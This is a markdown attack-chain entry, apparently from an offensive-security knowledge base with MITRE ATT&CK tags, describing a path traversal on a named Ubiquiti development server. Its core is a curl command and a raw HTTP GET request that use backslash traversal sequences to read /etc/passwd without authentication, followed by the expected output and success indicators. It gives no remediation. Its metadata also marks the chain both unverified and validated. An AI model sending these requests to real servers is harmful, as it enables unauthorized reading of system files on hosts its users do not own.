---
tags:
  - path-traversal
  - lfi
  - web-vuln
  - docker
  - information-disclosure
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
  - Linux
  - Docker
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Path-Traversal-for-Local-File-Read]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:21.717Z'
description: >-
  Exploits a path traversal vulnerability on the Ubiquiti dev-nightly server to
  read local files like /etc/passwd within a Docker container.
skill_level: beginner
impact_level: high
id: 1c6230b0-0a77-4053-b54e-54d403b2b0b3
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Path Traversal to Read Sensitive Files on Ubiquiti Dev Server

Multi-stage attack chain demonstrating exploitation of a path traversal vulnerability to achieve local file read on a public-facing web server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~1 minute |
| Skill Level | Beginner |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via Web] --> B[Execution: Path Traversal]
    B --> C[Discovery: File Read]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web server on Linux/Docker
- Publicly accessible HTTPS endpoint (e.g., https://dev-nightly.ubnt.com)
- No authentication required

### Initial Access Requirements

- Internet access to the target URL
- No prior credentials or network position needed

## Detailed Attack Procedures

### Step 1: Exploit Path Traversal
procedure: [[procedures/Exploit-Path-Traversal-for-Local-File-Read]]

**Objective**: Send a crafted HTTP request to traverse directories and read sensitive files outside the web root, such as /etc/passwd.

**Instructions**: Use [[commands/curl-path-traversal]] to send the GET request with traversal payload:

```bash
curl "https://dev-nightly.ubnt.com/..\\..\\..\\etc\\passwd"
```

Alternatively, craft the raw HTTP request using [[commands/http-get-path-traversal]]:

```bash
GET /..\..\..\..\..\..\..\..\..\..\..\..\..\..\etc\passwd HTTP/1.1
Host: dev-nightly.ubnt.com
```

**Expected Output**: The contents of the /etc/passwd file, listing user accounts and potentially other system details.

**Success Indicators**:
- Response contains user entries like "root:x:0:0:root:/root:/bin/bash"
- No 404 or access denied errors
- File contents match expected format for /etc/passwd

## Attack Chain Summary

### Key Achievements

1. Successful traversal to read /etc/passwd, exposing user information
2. Demonstration of vulnerability in Docker-contained web server
3. High-impact information disclosure without authentication

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
